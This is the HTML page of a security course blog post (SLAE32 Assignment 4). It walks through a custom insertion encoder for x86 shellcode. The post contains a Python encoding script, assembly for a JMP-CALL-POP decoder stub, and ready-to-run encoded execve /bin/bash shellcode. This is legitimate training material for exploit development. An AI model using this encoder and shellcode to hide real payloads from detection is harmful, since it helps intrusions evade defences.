@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SLAE32 | Jeremy Catelain</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="SLAE32" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description of the assignment Create a custom encoding scheme like the “Insertion Encoder” we showed you; PoC with using execve-stack as the shellcode to encode with your schema and execute." />
+<meta property="og:description" content="Description of the assignment Create a custom encoding scheme like the “Insertion Encoder” we showed you; PoC with using execve-stack as the shellcode to encode with your schema and execute." />
+<link rel="canonical" href="http://localhost:4000/slae32/2022/10/02/Assign4-encoder.html" />
+<meta property="og:url" content="http://localhost:4000/slae32/2022/10/02/Assign4-encoder.html" />
+<meta property="og:site_name" content="Jeremy Catelain" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-02T08:45:58+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SLAE32" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-02T08:45:58+02:00","datePublished":"2022-10-02T08:45:58+02:00","description":"Description of the assignment Create a custom encoding scheme like the “Insertion Encoder” we showed you; PoC with using execve-stack as the shellcode to encode with your schema and execute.","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/10/02/Assign4-encoder.html"},"url":"http://localhost:4000/slae32/2022/10/02/Assign4-encoder.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jeremy Catelain" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><div class="align-left">
+            <div class="image-cropper"><img src="/images/photo-profil-2.jpg" alt="photo de profil" class="rounded" /></div>
+            <div class="align-left2">
+                <a class="site-title" rel="author" href="/">Jeremy Catelain </a><div class="site-job">Cybersecurity Consultant</div></div>
+        </div><nav class="site-nav">
+            <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+            <label for="nav-trigger">
+                <span class="menu-icon">
+                    <svg viewBox="0 0 18 15" width="18px" height="15px">
+                        <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+                    </svg>
+                </span>
+            </label>
+
+            <div class="trigger"><a class="page-link" href="/categories/2022-09-14-categories.html">CATEGORIES</a><a class="page-link" href="/">Home</a><a class="page-link" href="/about/">ABOUT</a></div>
+        </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+
+        <div class="wrapper">
+                <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+        <header class="post-header">
+            <div class="post-header-about">
+                <h1 class="post-list-heading2 p-name" itemprop="name headline">SLAE32</h1>
+                <h1 class="post-list-heading3 p-name" itemprop="name headline">|  Assignment 4 - Encoder</h1>
+            </div>
+            <p class="post-meta-title">
+                <time class="dt-published" datetime="2022-10-02T08:45:58+02:00" itemprop="datePublished">Oct 2, 2022
+                </time></p><a class="github-link-post" href="/TODO"> Github </a></header>
+
+        <div class="post-content e-content" itemprop="articleBody">
+            <h3 id="-description-of-the-assignment-"><span style="color:#2d8fb3;"> Description of the assignment </span></h3>
+
+<ul>
+  <li>Create a custom encoding scheme like the “Insertion Encoder” we showed you;</li>
+  <li>PoC with using execve-stack as the shellcode to encode with your schema and execute.</li>
+</ul>
+
+<!--more-->
+
+<h3 id="-principal-"><span style="color:#2d8fb3;"> Principal </span></h3>
+
+<p>In this assignment, we will create a custom Incremental Insertion Encoder.</p>
+
+<p>Here an exemple of how the encoder will works :</p>
+
+<p>Original shellcode :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0x10
+</code></pre></div></div>
+
+<p>Encoded shellcode :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x1,0xAA,0x2,0x3,0xAA,0xAA,0x4,0x5,0x6,0xAA,0xAA,0xAA,0x7,0x8,0x9,0x10,0xbb,0xbb,0xbb,0xbb
+</code></pre></div></div>
+
+<h3 id="-encoder-"><span style="color:#2d8fb3;"> Encoder </span></h3>
+
+<p>In this section, you will find a python script which will encode the source shellcode in the right format.</p>
+
+<p>The structure of the code is as follows :</p>
+
+<p>1) It retrieves the size of the shellcode and compute how many set of the data there will be, the size of the last set and deducts with those information the number of values remaining in the last set.</p>
+
+<p>2) Then, it builds our encoded shellcode by retrieving set by set the values from our shellcode until the ultimate set.</p>
+
+<p>3) Because the last set might not be completely fulfilled, it will only retrieve from the shellcode the number of values that remains.</p>
+
+<p>4) It inserts the EGG at the end of the shellcode.</p>
+
+<p>5) And finally, it prints our encoded shellcode.</p>
+
+<h4 id="result">Result:</h4>
+
+<p><img src="/assets/slae32-img/assignment4/inc-ins.PNG" alt="drawing" style="width:900px;" /></p>
+
+<h4 id="code">Code</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python
+
+import sys
+
+input = sys.argv[1] 
+
+print 'String length : '+ str(len(input))
+
+### Initialization of the Lists
+# Retrieve the shellcode and insert it into a list
+stringList = [input[i:i+4] for i in range(0, len(input), 4)]
+# Empty list for our encoded shellcode
+stringListEncoded = []
+
+
+### First part to compute the number of set, the size of the last set and the number of value in the last set
+#Counters
+nbSet = 0
+length = len(stringList)
+valPos = 1
+lengthSet = 1
+
+print "length" + str(length)
+
+# Compute how many set of data there will be.
+while valPos &lt;= length:
+    valPos = valPos + lengthSet  
+    lengthSet = lengthSet + 1
+    nbSet = nbSet + 1
+
+# Compute how many value are in the last set
+l = valPos - lengthSet
+supplIt = length - (valPos - lengthSet)
+print(supplIt) #nb iterations supplementaires
+
+
+### Second part, build the encoded shellcode   
+# Counters
+nbInsertion = 1
+posValue = 0
+nbValueToMove = 1
+savedPosValue = 0
+
+# Iteration until nbSet-1 
+while nbInsertion &lt;= (nbSet - 1): 
+    nbVal = 0
+    while nbVal &lt; nbInsertion : # nb value to move = nb insertion
+        val = '0x%02s' % stringList[posValue + nbVal][2:]
+        stringListEncoded.append(val) # Insert the value in the list for the encoded shellcode     
+        nbVal = nbVal + 1
+
+    # Encoding insertion 0xaa
+    nbEncode = 0
+    while nbEncode &lt; nbInsertion:
+        encoder =  '0x%02x' % 0xaa
+        stringListEncoded.append(encoder) #insert
+        nbEncode = nbEncode + 1
+    
+    # Increment counters
+    savedPosValue = posValue
+    posValue = posValue + nbInsertion 
+    nbInsertion = nbInsertion + 1
+    
+# Last iteration
+it = 0
+while it &lt; supplIt:
+    val = '0x%02s' % stringList[posValue+it][2:]
+    stringListEncoded.append(val) #insert 
+    it = it + 1
+
+
+# Insertion of the Egg at the end
+for i in range(4):
+    encoder = '0x%02x' % 0xbb
+    stringListEncoded.append(encoder) #insert 
+
+# Convert the list into the good format and display the result
+finalvalue = ""
+for val in stringListEncoded:
+    finalvalue = finalvalue + str(val) + ','
+
+print finalvalue
+</code></pre></div></div>
+
+<h3 id="-decoder-shellcode-"><span style="color:#2d8fb3;"> Decoder shellcode </span></h3>
+
+<p>Now that we have our encoded shellcode, we will have to create our assembly code which go throught our encoded shellcode, retrieves the interesting part, replace them in the desired position and when finally the “Egg” is found, execute it.</p>
+
+<p>First, we used the JMP-CALL-POP technic to retrieve the address of our encoded shellcode and stored it in ESI.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_start:
+    jmp short calldecoder ; jump to the calldecoder section
+.....
+...
+..
+decoder : 
+    pop esi ; retrieve the address of the EncodedShellcode	
+    .....
+    ...
+    ..
+calldecoder : 
+    call decoder
+    EncodedShellcode : db 0x1,0xAA,0x2,0x3,0xAA,0xAA,0x4,0x5,0x6,0xAA,0xAA,0xAA,0x7,0x8,0x9,0x10,0xbb,0xbb,0xbb,0xbb
+</code></pre></div></div>
+
+<p>Then, we initialized our counters and registers.</p>
+
+<ul>
+  <li>
+    <p>Initialization of our counter EDX to 1 :</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  mov dl, 0x1 ; Initialize the counter to 1
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Initialization of the EBX register which represent the number of shift from the ESI register to point to the first value of the set of value that we want to retrieve :</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  xor ebx, ebx 
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Initialization of the EDI register which point to the address where we want to write</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  mov edi, esi 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>The next step is to create our function which will go from on set of values to the next one and check that we didn’t arrive at the end of our shellcode.</p>
+
+<p>To check if we arrived at the end of our shellcode, we inserted an Egg “0xbbbbbbbb” at the end of it, so that we only need to check if the next 4 bytes match with our egg. And in case of a match, we jump to our shellcode to execute it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nextSetValues : 
+    cmp dword [esi + ebx + 0x4], 0xbbbbbbbb
+    je EncodedShellcode
+</code></pre></div></div>
+
+<p>In the situation that we didn’t find our egg, we search for the place to write by adding the value of the counter EDX to the EDI register.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lea edi, [edi + edx]
+</code></pre></div></div>
+
+<p>Once we find where we want to write, we need to locate the set of value that we want to retrieve. To find them, we use the arithmetic computation “EBX = EBX + 2*EDX”.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov al, 2 ; Intialize the value of eax to 2	
+mul dl	; Multiply EAX with EDX (2*edx)
+add eax, ebx  ; Add EBX to EAX (EAX = EBX + 2*EDX)
+mov ebx, eax ; mov into EBX the valu of EAX
+</code></pre></div></div>
+
+<p>We can notice that the counter’s value is equal to the number of value that we need to copy :</p>
+<ul>
+  <li>Counter EDX = 1, number of value to copy is 1</li>
+  <li>Counter EDX = 2, number of value to copy is 2</li>
+  <li>etc…</li>
+</ul>
+
+<p>So we need to create a function which has another counter (ECX) that copy each value in the set of value that we need to retrieve (ESI + EBX + ECX) into the proper location (EDI + ECX) until that counter is less or equal to the counter EDX.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    xor ecx, ecx 			; Init the counter to zero
+
+nextValues :
+    pusha ; Save registers state
+    ; Find the location where we want to write the value
+    xor eax, eax
+    lea eax, [edi + ecx]                ; Value at EDI + ECX
+
+    ;Find the value that we want to retrieve and copy in the location previously found
+    add ebx, ecx                        ; EBX + ECX
+    lea edx, [esi + ebx]                ; lea edx, [esi + ebx + ecx]
+    mov bl, byte [edx] 			; mov the value into bl
+    mov byte [eax], bl 			; mov the value we temporary stored at bl into al
+
+    popa				; Restore the registers
+    
+    inc ecx			        ; Increment the counter to go to the next value of the set
+    cmp ecx, edx		        ; Compare EDX and ECX		
+    jle short nextValues                ; If the same value, no more value to move
+</code></pre></div></div>
+
+<p>Then, if the counter ECX is greater than EDX, we need to go to the next set of value.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inc edx					; Increment the counter
+jmp short nextSetValues			; Go to the next set of value to retrieve
+</code></pre></div></div>
+
+<p>In this assessment, we used the JMP-CALL-POP Execve shellcode from the exercise as follows :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+</code></pre></div></div>
+
+<p>Then, we used the python encoded (see picture section Encoder) to encoded it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x31,0xaa,0xc0,0x50,0xaa,0xaa,0x68,0x62,0x61,0xaa,0xaa,0xaa,0x73,0x68,0x68,0x62,0xaa,0xaa,0xaa,0xaa,0x69,0x6e,0x2f,0x68,0x2f,0xaa,0xaa,0xaa,0xaa,0xaa,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xcd,0x80,0xbb,0xbb,0xbb,0xbb
+</code></pre></div></div>
+
+<p>Finally we compile our shellcode by doing the following steps :</p>
+
+<p>First, we compiled our assembly code :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nasm -f elf -o ExecEncodedShellcode.o ExecEncodedShellcode.nasm
+ld -m elf_i386 ExecEncodedShellcode.o -o ExecEncodedShellcode
+</code></pre></div></div>
+
+<p>Then, we used the objdump tool to retrieve our shellcode intructions :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump -d ExecEncodedShellcode|grep '[0-9a-f]:'|sed -n '1!p'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+</code></pre></div></div>
+
+<p>Which gave the following result:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"\xeb\x3f\x31\xf6\x5e\x31\xd2\xb2\x01\x31\xdb\x31\xff\x89\xf7\x31\xc0\x31\xc9\x8d\x3c\x17\xb0\x02\xf6\xe2\x01\xd8\x89\xc3\x31\xc9\x60\x31\xc0\x8d\x04\x0f\x01\xcb\x81\x3c\x1e\xbb\xbb\xbb\xbb\x74\x15\x8d\x14\x1e\x8a\x1a\x88\x18\x61\x41\x39\xd1\x7e\xe2\x42\xeb\xd2\xe8\xbc\xff\xff\xff\x31\xaa\xc0\x50\xaa\xaa\x68\x62\x61\xaa\xaa\xaa\x73\x68\x68\x62\xaa\xaa\xaa\xaa\x69\x6e\x2f\x68\x2f\xaa\xaa\xaa\xaa\xaa\x2f\x2f\x2f\x89\xe3\x50\xaa\xaa\xaa\xaa\xaa\xaa\x89\xe2\x53\x89\xe1\xb0\x0b\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xcd\x80\xbb\xbb\xbb\xbb"
+</code></pre></div></div>
+
+<p>And finally we insert the shellcode in our C file, compiled it and launched it :</p>
+
+<p><strong>Result</strong></p>
+
+<p><img src="/assets/slae32-img/assignment4/final.PNG" alt="drawing" style="width:900px;" /></p>
+
+        </div>
+
+
+        <!--<a class="u-url" href="/slae32/2022/10/02/Assign4-encoder.html" hidden></a>
+          -->
+    </article>
+
+        </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+      <!--<h2 class="footer-heading">Jeremy Catelain</h2> -->
+
+    <div class="Github-link"></div>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <!--<ul class="contact-list">
+          <li class="p-name">Jeremy Catelain</li>
+        </ul> -->
+      </div>
+
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a class="social-media-listed" href="https://github.com/jeremycatelain"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jeremycatelain</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+          <p>COPYRIGHT 2022 JEREMY CATELAIN - ALL RIGHTS RESERVED.</p>
+      </div>
+  </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
